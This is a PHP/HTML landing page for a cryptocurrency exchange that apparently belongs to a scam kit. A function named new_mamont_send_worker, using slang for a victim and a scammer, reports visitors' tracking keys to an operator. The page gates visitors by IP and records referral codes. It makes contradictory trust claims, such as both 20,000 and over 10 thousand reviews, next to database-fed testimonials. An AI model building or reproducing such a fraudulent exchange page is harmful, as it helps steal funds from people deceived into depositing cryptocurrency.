<!DOCTYPE html>
<html lang="en">

<?php

include('../layout/en/head.php');
include('../vender/logic.php');
$block = check_ip();
if ($block == false) {
    header('Location: ' . 'en/error.php');
}
check_review();
if (isset($_GET['ref'])) {
    if (!isset($_SESSION)) {
        session_start();
    }
    $_SESSION['ref'] = $_GET['ref'];
}
if (isset($_GET['key'])) {
    if (!isset($_SESSION)) {
        session_start();
    }
    $_SESSION['key'] = $_GET['key'];
    new_mamont_send_worker($_GET['key']);
}
?>

<body>

    <div class="wrapper">
        <div class="preloader">
            <div class="preloader__loader"></div>
        </div>
        <?php
        session_start();
        if (isset($_SESSION['email'])) {
            include('../layout/en/header_reg.php');
        } else {
            include('../layout/en/header.php');
        }
        ?>
        <div class="coins">
            <div class="container coins__container">
                <div class="coins__img coins__img_usdt wow animate__fadeInLeft" data-wow-delay=".5s">
                    <img src="../img/coins/usdt.svg" alt="usdt">
                </div>
                <div class="coins__img coins__img_btc wow animate__fadeInRight" data-wow-delay=".5s">
                    <img src="../img/coins/btc.svg" alt="btc">
                </div>
            </div>
        </div>
        <main class="main">
            <section class="exchange">
                <div class="container exchange__container">
                    <h1 class="title exchange__title wow animate__fadeInUp">
                        Reliable and convenient cryptocurrency exchange
                    </h1>
                    <h2 class="exchange__subtitle wow animate__fadeInUp" data-wow-delay=".25s">
                        The main value that we have is our reputation and the trust of our customers, which
                        confirms over 20,000 positive reviews
                    </h2>
                    <div class="panel exchange__panel wow animate__fadeInUp" data-wow-delay=".5s">
                        <div class="panel__top exchange__panel-top">
                            <div class="panel__wrapper">
                                <div class="panel__step exchange__panel-step">
                                    1
                                </div>
                                <p class="panel__text exchange__panel-step-text">
                                    Choose an exchange direction from the lists below
                                </p>
                            </div>
                            <div class="panel__wrapper">
                                <a class="panel__btn exchange__panel-val-btn panel__btn_active" data-type="" href="#">
                                    All
                                </a>
                                <a class="panel__btn exchange__panel-val-btn" data-type="_bank" href="#">
                                    Banks
                                </a>
                                <a class="panel__btn exchange__panel-val-btn" data-type="_coin" href="#">
                                    Cryptocurrency
                                </a>
                            </div>
                        </div>
                        <div class="panel__line exchange__panel-line"></div>
                        <div class="panel__bottom">
                            <div class="title panel__title exchange__panel-title">
                                Sell Bitcoin (BTC) for Ethereum (ETH)
                            </div>
                            <div class="panel__bottom-wrapper exchange__panel-bottom-wrapper">
                                <div class="panel__start exchange__panel-start">
                                    <div class="select">
                                        <div class="select__header">
                                            <div class="select__current" id="select__current-give">
                                                <img class="select__img" src="../img/coins/btc.svg" alt="btc" data-coin="BTC">
                                                Bitcoin
                                            </div>
                                            <div class="select__text">
                                                <img src="../img/select/magnifier.png" alt="magnifier">
                                                Change
                                            </div>
                                        </div>
                                        <div class="select__body" id="select__body-give">
                                            <?php

                                            $coins = get_exchange();
                                            while ($coin = $coins->fetch_array()) {
                                                if ($coin['from'] == 1) {
                                                    if ($coin['type'] == 'crypto') {
                                                        echo '<div class="select__item select__item_coin">';
                                                        echo '<img class="select__img" src="../img/coins/' . $coin['icon'] . '" alt="' . mb_strtolower($coin['sign']) . '"data-coin="' . $coin['sign'] . '">';
                                                    } elseif ($coin['type'] == 'card') {
                                                        echo '<div class="select__item select__item_bank">';
                                                        echo '<img class="select__img" src="../img/banks/' . $coin['icon'] . '" alt="' . mb_strtolower($coin['sign']) . '"data-coin="' . $coin['sign'] . '">';
                                                    }

                                                    echo $coin['name'];
                                                    echo '</div>';
                                                }
                                            }
                                            ?>
                                        </div>
                                    </div>
                                    <div class="input__wrapper mt-10">
                                        <input class="input" id="from" type="number" step="0.1" placeholder="How much do you give">
                                        <p class="input__text">
                                            BTC
                                        </p>
                                    </div>
                                    <div class="panel__wrapper mt-25 exchange__panel-wrapper exchange__panel-wrapper-show">
                                        <a class="btn btn_background_blue exchange__panel-btn create_exchange" href="#">Proceed to payment</a>
                                        <p class="panel_text panel__text_small wd-260 ml-20 exchange__panel-text">
                                            By clicking the button, you agree to the <a class="panel__link-rules" href="rules.php">Rules</a>
                                        </p>
                                    </div>
                                </div>
                                <div class="panel__end exchange__panel-end">
                                    <div class="select">
                                        <div class="select__header">
                                            <div class="select__current" id="select__current-get">
                                                <img class="select__img" src="../img/coins/eth.svg" alt="coin" data-coin="ETH">
                                                Ethereum
                                            </div>
                                            <div class="select__text">
                                                <img src="../img/select/magnifier.png" alt="magnifier">
                                                Change
                                            </div>
                                        </div>
                                        <div class="select__body" id="select__body-get">
                                            <?php
                                            $coins = get_exchange();
                                            while ($coin = $coins->fetch_array()) {
                                                if ($coin['to'] == 1) {
                                                    if ($coin['type'] == 'crypto') {
                                                        echo '<div class="select__item select__item_coin">';
                                                        echo '<img class="select__img" src="../img/coins/' . $coin['icon'] . '" alt="' . mb_strtolower($coin['sign']) . '"data-coin="' . $coin['sign'] . '">';
                                                    } elseif ($coin['type'] == 'card') {
                                                        echo '<div class="select__item select__item_bank">';
                                                        echo '<img class="select__img" src="../img/banks/' . $coin['icon'] . '" alt="' . mb_strtolower($coin['sign']) . '"data-coin="' . $coin['sign'] . '">';
                                                    }
                                                    echo $coin['name'];
                                                    echo '</div>';
                                                }
                                            }
                                            ?>
                                        </div>
                                    </div>
                                    <div class="input__wrapper mt-10">
                                        <input type="hidden" id="to_kurs">
                                        <input class="input" id="to" type="number" step="0.1" placeholder="How much do you get">
                                        <p class="input__text">
                                            ETH
                                        </p>
                                    </div>
                                    <input class="input mt-10" id="input__get" type="text" placeholder="Your address Ethereum">
                                </div>
                                <div class="panel__wrapper mt-25 exchange__panel-wrapper exchange__panel-wrapper-hide">
                                    <a class="btn btn_background_blue exchange__panel-btn create_exchange" href="#">Proceed to payment</a>
                                    <p class="panel_text panel__text_small wd-260 ml-20 exchange__panel-text">
                                        By clicking the button, you agree to the <a class="panel__link-rules" href="rules.php">Rules</a>
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <div class="shapes">
                <div class="container shapes__container">
                    <img class="shapes__img shapes__img_1 wow animate__fadeInUp" data-wow-delay=".5s" src="../img/shapes/1.png" alt="shape">
                    <img class="shapes__img shapes__img_2 wow animate__fadeInUp" data-wow-delay=".15s" src="../img/shapes/2.png" alt="shape">
                    <img class="shapes__img shapes__img_3 wow animate__fadeInUp" data-wow-delay=".25s" src="../img/shapes/3.png" alt="shape">
                    <img class="shapes__img shapes__img_4 wow animate__fadeInUp" data-wow-delay=".35s" src="../img/shapes/4.png" alt="shape">
                    <img class="shapes__img shapes__img_5 wow animate__fadeInUp" data-wow-delay=".45s" src="../img/shapes/5.png" alt="shape">
                    <img class="shapes__img shapes__img_6 wow animate__fadeInUp" data-wow-delay=".5s" src="../img/shapes/6.png" alt="shape">
                    <img class="shapes__img shapes__img_7 wow animate__fadeInUp" data-wow-delay=".15s" src="../img/shapes/7.png" alt="shape">
                    <img class="shapes__img shapes__img_8 wow animate__fadeInUp" data-wow-delay=".25s" src="../img/shapes/8.png" alt="shape">
                    <img class="shapes__img shapes__img_9 wow animate__fadeInUp" data-wow-delay=".35s" src="../img/shapes/9.png" alt="shape">
                    <img class="shapes__img shapes__img_10 wow animate__fadeInUp" data-wow-delay=".45s" src="../img/shapes/10.png" alt="shape">
                </div>
            </div>
            <section class="advantages">
                <div class="container advantages__container">
                    <h3 class="title advantages__title wow animate__fadeInUp">
                        Our advantages
                    </h3>
                    <div class="advantages__wrapper">
                        <div class="advantages__block wow animate__fadeInUp" data-wow-delay=".25s">
                            <div class="advantages__block-img">
                                <img src="../img/advantages/icons/1.png" alt="icon">
                            </div>
                            <h5 class="advantages__block-title">
                                >10 thousand reviews
                            </h5>
                            <h6 class="advantages__block-subtitle">
                                On independent platforms
                            </h6>
                        </div>
                        <div class="advantages__block wow animate__fadeInUp" data-wow-delay=".25s">
                            <div class="advantages__block-img">
                                <img src="../img/advantages/icons/2.png" alt="icon">
                            </div>
                            <h5 class="advantages__block-title">
                                Over 200
                            </h5>
                            <h6 class="advantages__block-subtitle">
                                Exchange directions
                            </h6>
                        </div>
                        <div class="advantages__block wow animate__fadeInUp" data-wow-delay=".25s">
                            <div class="advantages__block-img">
                                <img src="../img/advantages/icons/3.png" alt="icon">
                            </div>
                            <h5 class="advantages__block-title">
                                15 minutes
                            </h5>
                            <h6 class="advantages__block-subtitle">
                                Time of processing
                            </h6>
                        </div>
                        <div class="advantages__block wow animate__fadeInUp" data-wow-delay=".25s">
                            <div class="advantages__block-img">
                                <img src="../img/advantages/icons/4.png" alt="icon">
                            </div>
                            <h5 class="advantages__block-title">
                                24582 clients
                            </h5>
                            <h6 class="advantages__block-subtitle">
                                Make exchanges
                            </h6>
                        </div>
                        <div class="advantages__block wow animate__fadeInUp" data-wow-delay=".25s">
                            <div class="advantages__block-img">
                                <img src="../img/advantages/icons/5.png" alt="icon">
                            </div>
                            <h5 class="advantages__block-title">
                                2016
                            </h5>
                            <h6 class="advantages__block-subtitle">
                                Beginning of work
                            </h6>
                        </div>
                        <div class="advantages__block wow animate__fadeInUp" data-wow-delay=".25s">
                            <div class="advantages__block-img">
                                <img src="../img/advantages/icons/6.png" alt="icon">
                            </div>
                            <h5 class="advantages__block-title">
                                425000
                            </h5>
                            <h6 class="advantages__block-subtitle">
                                Exchanges for 6 years
                            </h6>
                        </div>
                    </div>
                </div>
            </section>
            <section class="reviews" id="reviews">
                <div class="container reviews__container">
                    <div class="reviews__wrapper">
                        <?php
                        $reviews = get_review_nums(1, 6);
                        while ($review = $reviews->fetch_array()) {
                            echo '<div class="reviews__block wow animate__fadeIn" data-wow-delay=".25s">
                                        <div class="reviews__block-top">
                                            <img src="../img/icons/user.svg" alt="user">
                                            <div class="reviews__block-wrapper ml-20">
                                                <div class="reviews__block-username">
                                                    ' . $review['name-en'] . '
                                                </div>
                                                <div class="reviews__block-date">
                                                    ' . $review['data'] . '
                                                </div>
                                            </div>
                                        </div>
                                        <div class="reviews__block-bottom">
                                            <p class="reviews__block-text">
                                                ' . $review['descriptions-en'] . '
                                            </p>
                                        </div>
                                    </div>';
                        }
                        ?>

                    </div>
                    <a class="btn btn_background_blue wd-full mt-25 text-center wow animate__fadeIn" data-wow-delay=".25s" id="read_reviews" href="#">Read all reviews</a>
                </div>
            </section>
        </main>
        <?php
        if (isset($_SESSION['email'])) {
            include('../layout/en/footer_reg.php');
        } else {
            include('../layout/en/footer.php');
        }
        ?>
    </div>
    <input type="hidden" id="coin_dict" value='<?php echo get_coin_dict(); ?>'>
    <script src="../js/libs/jquery-3.6.1.min.js"></script>
    <script src="../js/libs/wow.min.js"></script>
    <script src="../js/script.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
</body>

</html>